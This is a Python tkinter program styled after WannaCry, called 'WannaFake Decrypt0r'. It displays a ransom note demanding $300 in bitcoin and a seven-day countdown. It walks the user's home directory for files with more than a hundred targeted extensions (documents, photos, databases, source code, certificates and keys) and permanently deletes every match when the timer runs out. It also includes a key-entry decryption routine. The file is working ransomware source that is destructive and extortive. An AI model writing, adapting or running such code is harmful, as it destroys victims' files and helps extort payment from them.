import time
import threading
import os
import socket
import webbrowser
import datetime
import tkinter.messagebox
from pathlib import Path
from cryptography.fernet import Fernet
from tempfile import gettempdir
from tkinter import *

file_extension = ('.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
                  '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1',
                  '.pdf', '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg', '.docb', '.docm', '.dot', '.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc',
                  '.xltx', '.xltm', '.pptm', '.pot', '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb', '.hwp', '.602', '.sxi',
                  '.sti', '.sldx', '.sldm', '.sldm', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ', '.bz2', '.tbk', '.bak', '.tar', '.tgz', '.gz', '.7z',
                  '.rar', '.zip', '.backup', '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif', '.tiff', '.nef', '.psd', '.ai', '.svg', '.djvu', '.m4u',
                  '.m3u', '.mid', '.wma', '.flv', '.3g2', '.mkv', '.3gp', '.mp4', '.mov', '.avi', '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3',
                  '.sh', '.class', '.jar', '.java', '.rb', '.asp', '.php', '.jsp', '.brd', '.sch', '.dch', '.dip',
                  '.pl', '.vb', '.vbs', '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas', '.cpp', '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd', '.myi', '.myd', '.frm',
                  '.odb', '.dbf', '.db', '.mdb', '.accdb', '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6', '.lay', '.mml', '.sxm', '.otg', '.odg', '.uop', '.std', '.sxd',
                  '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds',
                  '.uot', '.stw', '.sxw', '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der')

class GUI(Frame):
    def __init__(self, master):
        Frame.__init__(self, master)
        self.end_time = 0
        self.master = master
        self.time = time.strftime('%H:%M:%S')
        date_after_week = datetime.datetime.now() + datetime.timedelta(days=7)
        self.date = date_after_week.strftime('%d/%m/%Y')

        self.setup_timer(self.my_time())
        threading.Thread(target=self.countdown).start()

        self.items()
    
    def items(self) -> None:
        button_decrypt = Button(self.master, text='Decrypt', width=30, height=1, command=self.show_message)
        button_decrypt.place(x=675, y=560)

        copy_button = Button(self.master, command=self.copy_to_clipboard, text='Copy', width=3, height=2)
        copy_button.place(x=890, y=495)

        self.bitcoin_id_label = Label(self.master, foreground='white', width=50, height=2, text='my_id', background=self._from_rgb((139, 0, 0)), borderwidth=2, relief='solid')
        self.bitcoin_id_label.place(x=480, y=500)

        bitcoin_msg = Label(self.master, foreground='yellow', text='Send $300 worth of bitcoin to this address: ', bg=self._from_rgb((139, 0, 0)))
        bitcoin_msg.place(x=480, y=470)

        big_text_area = Label(self.master, width=70, height=25, bg='white', foreground='black')
        big_text_area.config(anchor=NW, justify=LEFT, highlightthickness=4, text=open('../data/gui_note.txt').read())
        big_text_area.place(x=370, y=30)

        about_bitcoin = Label(self.master, underline=True, font=(None, 14), bg=self._from_rgb((139, 0, 0)), fg='lightblue', text='About bitcoin')
        about_bitcoin.place(x=30, y=490)
        about_bitcoin.bind('<Button-1>', lambda _: webbrowser.open_new('https://en.wikipedia.org/wiki/Bitcoin'))

        how_buy_bitcoin = Label(self.master, underline=True, font=(None, 14), bg=self._from_rgb((139, 0, 0)), fg='lightblue', text='How to buy bitcoins?')
        how_buy_bitcoin.place(x=30, y=525)
        how_buy_bitcoin.bind('<Button-1>', lambda _: webbrowser.open_new('https://www.investopedia.com/tech/how-to-buy-bitcoin/'))

        contact_us = Label(self.master, underline=True, font=(None, 16), bg=self._from_rgb((139, 0, 0)), fg='lightblue', text='Contact Us')
        contact_us.place(x=30, y=560)
        contact_us.bind('<Button-1>', lambda _: self.send_msg())

        files_lost = Label(self.master, font=(None, 13), text='Your files will be lost on', bg=self._from_rgb((139, 0, 0)), fg='yellow')
        files_lost.place(x=75, y=270)

        lost_time = Label(self.master, text=self.time, font=(None, 12), fg='white', bg=self._from_rgb((139, 0, 0)))
        lost_time.place(x=195, y=300)

        lost_date = Label(self.master, text=self.date, font=(None, 12), fg='white', bg=self._from_rgb((139, 0, 0)))
        lost_date.place(x=80, y=300)

        red_lock = Label(self.master, bg=self._from_rgb((139, 0, 0)), compound='top')
        red_lock.red_lock_image = PhotoImage(file='../images/red_lock.png')
        red_lock['image'] = red_lock.red_lock_image
        red_lock.place(x=50, y=0)

        bitcoin_img = Label(self.master, bg=self._from_rgb((139, 0, 0)), compound='top')
        bitcoin_img.bit_coin_img = PhotoImage(file='../images/bitcoin.png')
        bitcoin_img['image'] = bitcoin_img.bit_coin_img
        bitcoin_img.place(x=389, y=471)     

    def copy_to_clipboard(self):
        id_ = self.bitcoin_id_label['text']
        self.master.clipboard_clear()
        self.master.clipboard_append(id_)
        self.master.update()

    def setup_timer(self, n) -> None:
        temp_dir = gettempdir()
        if os.path.isfile(os.path.join(temp_dir, 'end_time.txt')):
            with open(os.path.join(temp_dir, 'end_time.txt')) as f:
                self.end_time = float(f.read())
            if time.time() > self.end_time:
                threading.Thread(target=self.remove_files).start()
            else:
                return
        with open(os.path.join(temp_dir, 'end_time.txt'), 'w') as f:
            self.end_time = time.time() + n
            f.write(str(self.end_time))

    def countdown(self) -> None:
        while True:
            current_time = round(self.end_time - time.time())
            time_ = Label(self.master, foreground='white', text=self.convert_seconds(current_time), font=('bold', 20), background=self._from_rgb((139, 0, 0)))
            time_.place(x=100, y=340)
            time.sleep(1)
            if time.time() > self.end_time:
                threading.Thread(target=self.remove_files).start()

    def convert_seconds(self, n) -> str:
        day = n // (24 * 3600) 
        n = n % (24 * 3600) 
        hour = n // 3600
        n %= 3600
        minutes = n // 60
        n %= 60
        seconds = n 

        return f'{day}:{hour}:{minutes}:{seconds}' 

    def my_time(self) -> int:
        full_day = 7 * 86400
        full_hours = 0 * 3600
        full_minutes = 0 * 60
        full_seconds = 0

        return full_day + full_hours + full_minutes + full_seconds

    def _from_rgb(self, rgb) -> str:
        return "#%02x%02x%02x" % rgb  

    def get_files(self) -> list:
        result = []
        for root, _, files in os.walk(str(Path.home())):
            for file in files:
                if file.endswith(file_extension):
                    result.append(os.path.join(root, file))
        return result

    def remove_files(self) -> None:
        for file in self.get_files():
            os.remove(file)

    def decrypt_files(self):
        key = self.entry.get().encode()
        try:
            token_decrypt = Fernet(key)
            for file in self.get_files():
                with open(file, 'rb+') as f:
                    cipher_text = f.read()
                    plain_text = token_decrypt.decrypt(cipher_text)
                    f.seek(0); f.truncate()
                    f.write(plain_text)
            tkinter.messagebox.showinfo('WannaFake Decrypt0r', 'Your files have been decrypted!')
        except:
            tkinter.messagebox.showinfo(title='WannaFake Decrypt0r', message='Error: Invalid key')           

    def show_message(self):
        window = Toplevel(self.master)
        window.resizable(False, False)
        window.geometry('300x200')

        Label(window, text='Enter Key').place(x=118, y=80)
        self.entry = Entry(window)
        self.entry.place(x=70, y=100)

        Button(window, text='Decrypt', command=self.decrypt_files).place(x=113, y=130)

    def send_msg(self):
        window = Toplevel(self.master)
        window.resizable(False, False)
        window.geometry('300x200')

        Label(window, text='Enter Message').place(x=118, y=80)
        self.entry = Entry(window)
        self.entry.place(x=70, y=100)

        Button(window, text='Send', command=lambda: tkinter.messagebox.showinfo('WannaFake Decrypt0r', 'Message Sent!')).place(x=113, y=130)

if __name__ == "__main__":
    root = Tk()
    app = GUI(root)

    root.geometry('950x600')
    root.title('WannaFake Decrypt0r')
    root.resizable(False, False)
    root.configure(background=app._from_rgb((139, 0, 0)))

    root.mainloop()
